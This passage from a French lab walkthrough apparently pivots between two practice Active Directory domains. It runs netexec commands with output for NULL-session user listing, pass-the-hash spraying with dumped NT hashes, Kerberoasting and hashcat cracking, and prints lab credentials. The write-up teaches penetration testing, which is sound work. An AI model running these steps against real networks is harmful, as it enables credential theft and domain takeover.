Logon script                 
User profile                 
Home directory               
Last logon                   7/6/2024 10:38:19 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *Domain Users         *Domain Admins        
                             *Group Policy Creator *Schema Admins        
                             *Enterprise Admins    
The command completed successfully.
```
------------------

## Résumé de l'épisode précédent

Résumons un peu les étapes qui ont été effectués pour compromettre le domaine `ROME`.

1. Partage __SMB__ - `babaorum`
    * Un __partage `SHAREACCESSIX`__ était accessible avec une session __anonyme__ (`-u 'a' -p ''`).
    * Ce dernier contenait des identifiants pour __`heftepix`__.
2. Serveur __FTP__ - `metronum`
    * On a pu s'y connecter avec les identifiants de `heftepix`.
    * On y trouve un __mot de passe__ `wUSYIuhhWy!!12OL` et quelques indices.
3. __RID Bute__ - password spraying
    * On __énumère__ les utilisateurs de domaine `ROME.local` avec __RID Brute__ et une __session `guest`__.
    * On fait un __password spraying__ avec le mot passe `wUSYIuhhWy!!12OL` sur les utilisateurs énumérés.
    * On trouve ainsi les identifiants de __`localix`__ qui est __administrateur local__ de `Metronum`.
4. Dump __LSA__ - `metronum`
    * On utilise ce compte __admin local `localix`__ pour __dumper__ les __hashs__ de mot de passe de `metronum`.
    * On obtient ainsi les identifiants de __`musculus`__, qui est utilisateur du domaine `ROME`.
5. __DPAPI__ - `metronum`
    * On utilise `--dpapi` pour extraire les __identifiants stockés__ dans le __Chrome__ de `musculus`.
    * Cela nous donne les identifiants de __`lapsus`__
6. __LAPS__ - `Referendum`
    * `lapsus` nous permet d'obtenir les __mots de passe__ de l'administrateur local __`admin01`__ pour `Metronum` et __`Referendum`__.
    * Ces mots de passe sont gérés par __LAPS__.
7. __MSOL__ - `Referendum`
    * Le compte `MSOL_80541c18ebaa` est exécuté sur la machine `Referendum`.
    * On utilise le module __`msol`__ avec le compte `admin01` pour extraire les __identifiants__ de __`MSOL_80541c18ebaa`__.
8. __DCSync__ - `babaorum`
    * `MSOL_80541c18ebaa` a les __droits__ de __réplication__ sur le domaine `ROME`.
    * On récupère __`ntds.dit`__ via ___DCSync___ avec le compte `MSOL_80541c18ebaa`.

------------------

# Pivot vers `Armorique.local` / `village`

Maintenant que le domaine `ROME` est compromis. Nous allons pivoter, et essayer de compromettre le second domaine `armorique.local`, dont la seule machine est le contrôleur de domaine `village`.

```C
# /etc/hosts
10.0.0.5	village armorique.local
```

## Password Spraying d'un domaine à l'autre

On va aller tester si des __mots de passe__ du domaine `rome.local` sont __réutilisés__ sur le domaine `armorique.local`.

### Énumération de `armorique.local`

Tout d'abord, nous allons lister les utilisateurs du domaine `armorique.local`.

On a la possibilité de se connecter avec une _NULL session_ sur le domaine `armorique.local`.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF6AC1">❯</font> <font color="#A6E22E">nxc</font> smb village -u <font color="#F4BF75">&apos;&apos;</font> -p <font color="#F4BF75">&apos;&apos;</font>        
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:village) (domain:armorique.local) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#A6E22E"><b>[+]</b></font> armorique.local\:
</code></pre></div>
{{< /rawhtml >}}

On peut utiliser cette connexion pour lister les utilisateurs du domaine.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF6AC1">❯</font> <font color="#A6E22E">nxc</font> smb village -u <font color="#F4BF75">&apos;&apos;</font> -p <font color="#F4BF75">&apos;&apos;</font> --users
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:village) (domain:armorique.local) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#A6E22E"><b>[+]</b></font> armorique.local\: 
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>-Username-                    -Last PW Set-       -BadPW- -Description-</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>asterix                       2024-07-03 05:18:26 0       Built-in account for administering the computer/domain</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>krbtgt                        2024-07-03 12:43:28 0       Key Distribution Center Service Account</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>obelix                        2024-07-03 12:54:30 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>panoramix                     2024-07-03 12:54:30 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>abraracourcix                 2024-07-03 12:54:30 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>assurancetourix               2024-07-03 12:54:30 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>bonemine                      2024-07-03 12:54:30 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>ordralfabetix                 2024-07-03 12:54:30 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>cetautomatix                  2024-07-03 12:54:30 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>idefix                        2024-07-03 12:54:30 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>agecanonix                    2024-07-03 12:54:31 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>vercingetorix                 2024-07-03 12:54:31 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>goudurix                      2024-07-03 12:54:31 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>jolitorax                     2024-07-03 12:54:31 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>pepe                          2024-07-03 12:54:31 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>cicatrix                      2024-07-03 12:54:31 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>falbala                       2024-07-03 12:54:31 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>tragicomix                    2024-07-03 12:54:31 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>diagnostix                    2024-07-03 12:54:31 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>antibiotix                    2024-07-03 12:54:32 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>ordalfabétix                  2024-07-03 12:54:32 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>prolix                        2024-07-03 21:58:03 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>informatix                    2024-07-03 12:54:32 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>alambix                       2024-07-06 10:31:41 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>porquépix                     2024-07-03 12:54:32 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F4BF75"><b>beaufix                       2024-07-03 12:54:32 0        </b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#66D9EF"><b>[*]</b></font> Enumerated 27 local users: ARMORIQUE
</code></pre></div>
{{< /rawhtml >}}

On crée ainsi une liste d'utilisateurs `armorique.users`:

```
asterix
Guest
krbtgt
obelix
panoramix
abraracourcix
assurancetourix
bonemine
ordralfabetix
cetautomatix
idefix
agecanonix
vercingetorix
goudurix
jolitorax
pepe
cicatrix
falbala
tragicomix
diagnostix
antibiotix
ordalfabétix
prolix
informatix
alambix
porquépix
beaufix
```

### Création d'une liste de hashs

Lors de l'utilisation de `--ntds` sur le DC babaorum. Une extraction de `ntds.dit` a été stocké dans le fichier `~/.nxc/logs/babaorum_10.0.0.4_2024-07-07_195642.ntds`.

On utilise `cut` pour extraire les _Hashs NT_.

```shell
grep -iv disabled ~/.nxc/logs/babaorum_10.0.0.4_2024-07-07_195642.ntds | cut -d ':' -f4 > rome.hashs
```

__`rome.hashs`:__

```
6beba33d18f9e0eba5c8080f362b7f76
31d6cfe0d16ae931b73c59d7e0c089c0
5160cc29facd160087422320c7fd082e
ead20c9e1a5879c1a5e667805f01b210
863937c2368fca626d494154969fa3f1
485f0a1259fca7feedc4ed446cd73f51
a18173360503e5d7a9896e77237cbebf
daed649b85afad70575c3ce846f3d8b6
6e63bdf716e7e8ea38bb16a7fd03558d
e9d56f8b7255cd0bf70505eb3070ca88
91baa4580b05f821e392ea7c436bbd91
be8e40a630e541e24a03311349cb291a
ac7121d5b6f0af7cf020a347a51bb698
0c5a8f7d371f7159fe673933401d0109
bc26132bc86bab561351244c959c4e61
5a8630be79b7da10099b001a5adee00e
b5afa6f98a1ca2ee9b43645dae87f741
40bc830efe84caaacbc58262bd5a3ace
35908c42619644b303e417ecc3f2366a
16ee2fbf32a9f5800d70070cd5e5b66a
7397391ffb9e81939e76a830019e0b62
dda224f756b385f1ef02924cb0df1adb
808022bae08938c2a345f3dec9d38277
c4efae63bf2f5b7af768e12cc749ba88
b2b47a85455927d48417b848763bf37d
a7f58eb584616d3f90d7096d52fd5259
3b235a452fe0fb3c119cbc2087203c08
eb0be077df394d2c9b8cf4e53496b888
a210e3719c40b9209b8a071d0173c5b8
0b9c62acf7e9754d98013f89d3ffdf4a
31c64d2a43a95066a3374da8a8e84320
```

### Password Spraying

On teste ensuite si des __mots de passe__ de `rome.local` sont utilisés sur le domaine `armorique.local`.

On utilise directement les _hashs NT_ du domaine `rome.local` écrits dans `rome.hashs` avec `-H`.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF6AC1">❯</font> <font color="#A6E22E">nxc</font> smb village -u users.village -H babaorum.ntds_hashes
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F92672"><b>[-]</b></font> armorique.local\diagnostix:91baa4580b05f821e392ea7c436bbd91 STATUS_LOGON_FAILURE
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F92672"><b>[-]</b></font> armorique.local\antibiotix:91baa4580b05f821e392ea7c436bbd91 STATUS_LOGON_FAILURE
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F92672"><b>[-]</b></font> armorique.local\ordalfabétix:91baa4580b05f821e392ea7c436bbd91 STATUS_LOGON_FAILURE
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F92672"><b>[-]</b></font> armorique.local\prolix:91baa4580b05f821e392ea7c436bbd91 STATUS_LOGON_FAILURE
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F92672"><b>[-]</b></font> armorique.local\informatix:91baa4580b05f821e392ea7c436bbd91 STATUS_LOGON_FAILURE
[...]
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#A6E22E"><b>[+]</b></font> armorique.local\prolix:808022bae08938c2a345f3dec9d38277
</code></pre></div>
{{< /rawhtml >}}

On trouve un compte dont le mot de passe est le même entre les deux domaines : `prolix`.

    prolix:808022bae08938c2a345f3dec9d38277    

On peut se connecter avec `prolix` sur `armorique.local`.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF6AC1">❯</font> <font color="#A6E22E">nxc</font> smb village -u <font color="#F4BF75">'prolix'</font> -H 808022bae08938c2a345f3dec9d38277
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:village) (domain:armorique.local) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#A6E22E"><b>[+]</b></font> armorique.local\prolix:808022bae08938c2a345f3dec9d38277
</code></pre></div>
{{< /rawhtml >}}

## Kerberoasting

On teste avec `prolix` les attaques classiques en environnement Active Directory.
Un _Kerberoasting_ nous permets de récupérer un __krb5tgs__ pour le compte `alambix`.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF6AC1">❯</font> <font color="#A6E22E">nxc</font> ldap village -u <font color="#F4BF75">'prolix'</font> -H 808022bae08938c2a345f3dec9d38277 --kerberoast <font color="#F4BF75">'alambix.kerberoasting'</font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:village) (domain:armorique.local) (signing:True) (SMBv1:False)
<font color="#66D9EF"><b>LDAP</b></font>        10.0.0.5        389    village          <font color="#A6E22E"><b>[+]</b></font> armorique.local\prolix:808022bae08938c2a345f3dec9d38277
<font color="#66D9EF"><b>LDAP</b></font>        10.0.0.5        389    village          <font color="#66D9EF"><b>[*]</b></font> Total of records returned 1
<font color="#66D9EF"><b>LDAP</b></font>        10.0.0.5        389    village          <font color="#F4BF75"><b>sAMAccountName: alambix memberOf: CN=Protected Users,CN=Users,DC=armorique,DC=local pwdLastSet: 2024-07-06 12:31:41.529105 lastLogon:2024-07-07 00:53:37.724003</b></font>
<font color="#66D9EF"><b>LDAP</b></font>        10.0.0.5        389    village          <font color="#F4BF75"><b>$krb5tgs$23$*alambix$ARMORIQUE.LOCAL$armorique.local/alambix*$d1b74f5ee70b29237e5d8dad519232e8$66321aef939f6873ac1ecc334721ab5393a759a8c62358ca0e55b28b03d19efffecab8b37530480c063fd9744a7a709f69761cd043f20b9f2065eeb8ed4d8f13722e27f091f4b4a2af9eabfdf5940779df6facc3b24639606a760248efb1d3d5cbf7b79a22fdc1b5f88ab1b75a744213c44111f3c61155523a2990d1947ba2d238a586e43a9475eb0748767c3aaad6ec7d13467df1aff1d324f72c3eeddd3714c3c39ea67f66d479a00dcf5b2b6b743dd23c276746e0dfcc95f6f9b20c2dc424fecbbf83397e436b17a1a25be1bad29f1cf6f9290e1824d5c3805a6c7926e4a1714da69acb579bb6b61b9774bd07c54bb45af1a523458cfb4d74ce24e7aa99a38511916dfae0979295f80e1029140b80aa9997b9b804c759054ff07a1c9ff758722289bf2de105d2ff8aa1b76455c7e70850305693f0c77ce36bcc7ae00bf5a968e0395a4c2a82b3f5c0c87d9de039dbfb897bbad7912ad28c4af16c4d0857520f5d656a1c71d732b9bdccb444bd691462fae3ed7d14bf42fab1b739bf612854f7a2e7a42d6f356079b793bbe95507e914a46d9e9b508d77aeb02f2898b2652e3d955ce2b2e2939cf3485322619cb389d38ed13349b4821206d49a8c999df1547c3c8fa59bc611ecf845d43ed8dc61ce20768ee7b3f78102bc48ba0cc62bc519ffda34fe06119008332b341adc07494febf890a30e862ef19588d5cab220cae706af96a1a68ec7e1b3dc5df4b4e4e3ea606533339d1e14def26a393d53033f22a7915674a28bc93437e8719f4269d2c5b4b0d55cdb3f3731bf3b39a4188671e7ae76dd2196020d566adf73fe722cba43fe1f98ac4c703d6e462a5d0b1c50c78c5daad53b1d2558288196a99da33ba236e49c08f2daf386cb6d6fc308e88de5dcd0cf3972d31adadf13d3e1a6edb0169bab173ee608875e6f1f077f237766d8a45b7c9e615d13a9d04696918cf6ffb1bd93111d535d78627df26541ba7506865a77d71d206bbf0fd0ca83d59443bf6e6202a950d1d7d02cf1f0bca9f745e67cf6978c0ee890fedb488beaf558941c748ded6ea0beac68bd8f73cbff0aa13ef79ad6552ba740363ecd578f2dc0230b2ded7c05d24dcf973dc89ac92eeed878b8aa6e18f9638438f5043dbf57ecf180ea558580593181368aab808c9b461b41579674c71c4605d0b390368336acaf481f8d9ee9d5a911be31f075faf25499c89589a28e66df33fdd8a00b31a90bb9d8ec7ded8d5e59f10b757e00124e451c3b28e487a3a6c4316b583543d15d2a3284fb6c4916f8e3d8c110bee94b9236c875792533e7ebb11a59a5032c01c4be9a85f5bf0629db8b24f355022bfb6e08e4b749d661ac33a32c1cccfd57c1cf24fdb46e8066ea6f84137351aaec7649916aa27c5107be3bc0aa75d53830cc6cbdcf1d60905a02f7d4b3ccdf9a2bd413ba98edcac59b8b005efcd325f3ebe8613deb68b4e71ce1cdc9ef37</b></font>
</code></pre></div>
{{< /rawhtml >}}

Il est possible de casser ce hash avec `hashcat`, et ainsi récupérer le mot de passe de `alambix`.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF6AC1">❯</font> <font color="#A6E22E">hashcat</font> <u style="text-decoration-style:single">alambix.kerberoasting</u> <u style="text-decoration-style:single">~/SecLists/Passwords/Leaked-Databases/rockyou.txt</u>
<font color="#F4BF75">Hash-mode was not specified with -m. Attempting to auto-detect hash mode.</font>
<font color="#F4BF75">The following mode was auto-detected as the only one matching your input hash:</font>

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol

<font color="#F4BF75">NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!</font>
<font color="#F4BF75">Do NOT report auto-detect issues unless you are certain of the hash type.</font>

$krb5tgs$23$*alambix$ARMORIQUE.LOCAL$armorique.local/alambix*$d1b74f5ee70b29237e5d8dad519232e8$66321aef939f6873ac1ecc334721ab5393a759a8c62358ca0e55b28b03d19efffecab8b37530480c063fd9744a7a709f69761cd043f20b9f2065eeb8ed4d8f13722e27f091f4b4a2af9eabfdf5940779df6facc3b24639606a760248efb1d3d5cbf7b79a22fdc1b5f88ab1b75a744213c44111f3c61155523a2990d1947ba2d238a586e43a9475eb0748767c3aaad6ec7d13467df1aff1d324f72c3eeddd3714c3c39ea67f66d479a00dcf5b2b6b743dd23c276746e0dfcc95f6f9b20c2dc424fecbbf83397e436b17a1a25be1bad29f1cf6f9290e1824d5c3805a6c7926e4a1714da69acb579bb6b61b9774bd07c54bb45af1a523458cfb4d74ce24e7aa99a38511916dfae0979295f80e1029140b80aa9997b9b804c759054ff07a1c9ff758722289bf2de105d2ff8aa1b76455c7e70850305693f0c77ce36bcc7ae00bf5a968e0395a4c2a82b3f5c0c87d9de039dbfb897bbad7912ad28c4af16c4d0857520f5d656a1c71d732b9bdccb444bd691462fae3ed7d14bf42fab1b739bf612854f7a2e7a42d6f356079b793bbe95507e914a46d9e9b508d77aeb02f2898b2652e3d955ce2b2e2939cf3485322619cb389d38ed13349b4821206d49a8c999df1547c3c8fa59bc611ecf845d43ed8dc61ce20768ee7b3f78102bc48ba0cc62bc519ffda34fe06119008332b341adc07494febf890a30e862ef19588d5cab220cae706af96a1a68ec7e1b3dc5df4b4e4e3ea606533339d1e14def26a393d53033f22a7915674a28bc93437e8719f4269d2c5b4b0d55cdb3f3731bf3b39a4188671e7ae76dd2196020d566adf73fe722cba43fe1f98ac4c703d6e462a5d0b1c50c78c5daad53b1d2558288196a99da33ba236e49c08f2daf386cb6d6fc308e88de5dcd0cf3972d31adadf13d3e1a6edb0169bab173ee608875e6f1f077f237766d8a45b7c9e615d13a9d04696918cf6ffb1bd93111d535d78627df26541ba7506865a77d71d206bbf0fd0ca83d59443bf6e6202a950d1d7d02cf1f0bca9f745e67cf6978c0ee890fedb488beaf558941c748ded6ea0beac68bd8f73cbff0aa13ef79ad6552ba740363ecd578f2dc0230b2ded7c05d24dcf973dc89ac92eeed878b8aa6e18f9638438f5043dbf57ecf180ea558580593181368aab808c9b461b41579674c71c4605d0b390368336acaf481f8d9ee9d5a911be31f075faf25499c89589a28e66df33fdd8a00b31a90bb9d8ec7ded8d5e59f10b757e00124e451c3b28e487a3a6c4316b583543d15d2a3284fb6c4916f8e3d8c110bee94b9236c875792533e7ebb11a59a5032c01c4be9a85f5bf0629db8b24f355022bfb6e08e4b749d661ac33a32c1cccfd57c1cf24fdb46e8066ea6f84137351aaec7649916aa27c5107be3bc0aa75d53830cc6cbdcf1d60905a02f7d4b3ccdf9a2bd413ba98edcac59b8b005efcd325f3ebe8613deb68b4e71ce1cdc9ef37:gaulois-x-toujours
</code></pre></div>
{{< /rawhtml >}}

On a donc un second compte sur le domaine `armorique.local`.

    alambix:gaulois-x-toujours

## Kerberos

Il n'est pas possible de se connecter en _NetNTLM_ avec `alambix`.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF6AC1">❯</font> <font color="#A6E22E">nxc</font> smb village -u <font color="#F4BF75">'alambix'</font> -p <font color="#F4BF75">'gaulois-x-toujours'</font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:village) (domain:armorique.local) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F92672"><b>[-]</b></font> armorique.local\alambix:gaulois-x-toujours STATUS_ACCOUNT_RESTRICTION
</code></pre></div>
{{< /rawhtml >}}

Mais il est possible de se connecter avec le __protocole _Kerberos___. Cela se fait très simplement avec `netexec` en ajoutant le paramètre __`-k`__.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF6AC1">❯</font> <font color="#A6E22E">nxc</font> smb village -k -u <font color="#F4BF75">'alambix'</font> -p <font color="#F4BF75">'gaulois-x-toujours'</font>
<font color="#66D9EF"><b>SMB</b></font>         village         445    village          <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:village) (domain:armorique.local) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         village         445    village          <font color="#A6E22E"><b>[+]</b></font> armorique.local\alambix:gaulois-x-toujours
</code></pre></div>
{{< /rawhtml >}}

## Gros Bait !

⚠️ Ce qui suit est un ___Rabbit Hole___. Le _share_ `TRAITUS` ne nous permet pas d'élever nos privilèges. À ce stade il était possible d'identifier le _gMSA_ en utilisant _BloodHound_.

L'utilisateur `alambix` nous donne accès au _share_ `TRAITUS`

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF6AC1">❯</font> <font color="#A6E22E">nxc</font> smb village -k -u <font color="#F4BF75">&apos;alambix&apos;</font> -p <font color="#F4BF75">&apos;gaulois-x-toujours&apos;</font> --shares
<font color="#66D9EF"><b>SMB</b></font>         village         445    village          <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:village) (domain:armorique.local) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         village         445    village          <font color="#A6E22E"><b>[+]</b></font> armorique.local\alambix:gaulois-x-toujours
<font color="#66D9EF"><b>SMB</b></font>         village         445    village          <font color="#66D9EF"><b>[*]</b></font> Enumerated shares
<font color="#66D9EF"><b>SMB</b></font>         village         445    village          <font color="#F4BF75"><b>Share           Permissions     Remark</b></font>
<font color="#66D9EF"><b>SMB</b></font>         village         445    village          <font color="#F4BF75"><b>-----           -----------     ------</b></font>
<font color="#66D9EF"><b>SMB</b></font>         village         445    village          <font color="#F4BF75"><b>ADMIN$                          Remote Admin</b></font>
<font color="#66D9EF"><b>SMB</b></font>         village         445    village          <font color="#F4BF75"><b>C$                              Default share</b></font>
<font color="#66D9EF"><b>SMB</b></font>         village         445    village          <font color="#F4BF75"><b>D$                              Default share</b></font>
<font color="#66D9EF"><b>SMB</b></font>         village         445    village          <font color="#F4BF75"><b>IPC$            READ            Remote IPC</b></font>
<font color="#66D9EF"><b>SMB</b></font>         village         445    village          <font color="#F4BF75"><b>NETLOGON        READ            Logon server share</b></font>
<font color="#66D9EF"><b>SMB</b></font>         village         445    village          <font color="#F4BF75"><b>SYSVOL          READ            Logon server share</b></font>
<font color="#66D9EF"><b>SMB</b></font>         village         445    village          <font color="#F4BF75"><b>TRAITUS         READ</b></font>
</code></pre></div>
{{< /rawhtml >}}

Le module `spider_plus` permet de télécharger facilement l'ensemble des fichiers présents sur les _Partages Réseau_ (_shares_).

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF6AC1">❯</font> <font color="#A6E22E">nxc</font> smb village -k -u <font color="#F4BF75">&apos;alambix&apos;</font> -p <font color="#F4BF75">&apos;gaulois-x-toujours&apos;</font> -M spider_plus -o DOWNLOAD_FLAG=True
<font color="#66D9EF"><b>SMB</b></font>         village         445    village          <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:village) (domain:armorique.local) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         village         445    village          <font color="#A6E22E"><b>[+]</b></font> armorique.local\alambix:gaulois-x-toujours
<font color="#66D9EF"><b>SPIDER_PLUS</b></font> village         445    village          <font color="#66D9EF"><b>[*]</b></font> Started module spidering_plus with the following options:
<font color="#66D9EF"><b>SPIDER_PLUS</b></font> village         445    village          <font color="#66D9EF"><b>[*]</b></font>  DOWNLOAD_FLAG: True
<font color="#66D9EF"><b>SPIDER_PLUS</b></font> village         445    village          <font color="#66D9EF"><b>[*]</b></font>     STATS_FLAG: True
<font color="#66D9EF"><b>SPIDER_PLUS</b></font> village         445    village          <font color="#66D9EF"><b>[*]</b></font> EXCLUDE_FILTER: ['print$', 'ipc$']
<font color="#66D9EF"><b>SPIDER_PLUS</b></font> village         445    village          <font color="#66D9EF"><b>[*]</b></font>   EXCLUDE_EXTS: ['ico', 'lnk']
<font color="#66D9EF"><b>SPIDER_PLUS</b></font> village         445    village          <font color="#66D9EF"><b>[*]</b></font>  MAX_FILE_SIZE: 50 KB
<font color="#66D9EF"><b>SPIDER_PLUS</b></font> village         445    village          <font color="#66D9EF"><b>[*]</b></font>  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
<font color="#66D9EF"><b>SMB</b></font>         village         445    village          <font color="#66D9EF"><b>[*]</b></font> Enumerated shares
<font color="#66D9EF"><b>SMB</b></font>         village         445    village          <font color="#F4BF75"><b>Share           Permissions     Remark</b></font>
<font color="#66D9EF"><b>SMB</b></font>         village         445    village          <font color="#F4BF75"><b>-----           -----------     ------</b></font>
<font color="#66D9EF"><b>SMB</b></font>         village         445    village          <font color="#F4BF75"><b>ADMIN$                          Remote Admin</b></font>
<font color="#66D9EF"><b>SMB</b></font>         village         445    village          <font color="#F4BF75"><b>C$                              Default share</b></font>
<font color="#66D9EF"><b>SMB</b></font>         village         445    village          <font color="#F4BF75"><b>D$                              Default share</b></font>
<font color="#66D9EF"><b>SMB</b></font>         village         445    village          <font color="#F4BF75"><b>IPC$            READ            Remote IPC</b></font>
<font color="#66D9EF"><b>SMB</b></font>         village         445    village          <font color="#F4BF75"><b>NETLOGON        READ            Logon server share</b></font>
<font color="#66D9EF"><b>SMB</b></font>         village         445    village          <font color="#F4BF75"><b>SYSVOL          READ            Logon server share</b></font>
<font color="#66D9EF"><b>SMB</b></font>         village         445    village          <font color="#F4BF75"><b>TRAITUS         READ</b></font>
<font color="#66D9EF"><b>SPIDER_PLUS</b></font> village         445    village          <font color="#A6E22E"><b>[+]</b></font> Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/village.json".
